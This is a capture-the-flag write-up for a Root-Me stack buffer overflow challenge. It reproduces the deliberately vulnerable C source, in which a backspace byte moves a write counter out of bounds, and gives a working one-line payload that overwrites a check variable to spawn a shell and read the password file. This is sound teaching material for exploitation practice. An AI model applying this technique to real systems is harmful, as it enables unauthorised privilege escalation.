# ELF x86: Stack buffer overflow basic 3

[root-me challenge](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-3): An intermediate level to familiarize yourself with stack overflows.

Environment configuration:

```text
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 Yes 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes  
```

Source code:

```text
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
 
void shell(void);
 
int main()
{
 
  char buffer[64];
  int check;
  int i = 0;
  int count = 0;
 
  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc)
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08:
                  count--;
                  printf("\b");
                  break;
                case 0x04:
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}
 
void shell(void)
{
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
```

----

`4*\x08` is going to decrease the value of `count` by `4` to get the `check` variable, which needs to be `0xbffffabc` (mind endian):

```text
app-systeme-ch16@challenge02:~$ cat <(python -c "print '\x08'*4 + '\xbc\xfa\xff\xbf'") - | ./ch16
cat .passwd
```

## Resources

* [Débordement de tampon - dans la pile](https://www.root-me.org/spip.php?article807)
* [François Boisson : Buffer Overflow ou explication de «une faille de type bufferoverflow ...](https://www.youtube.com/watch?v=u-OZQkv2ebw) (YouTube)
* [Stack Bug - Exploitation avancee de buffer overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/FR%20-%20Stack%20Bug%20-%20Exploitation%20avancee%20de%20buffer%20overflow.pdf)
* [Exploiting Stack Buffer Overflows in the Linux x86 Kernel](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Stack%20Buffer%20Overflows%20in%20the%20Linux%20x86%20Kernel.pdf)
* [64 Bits Linux Stack Based Buffer Overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf)
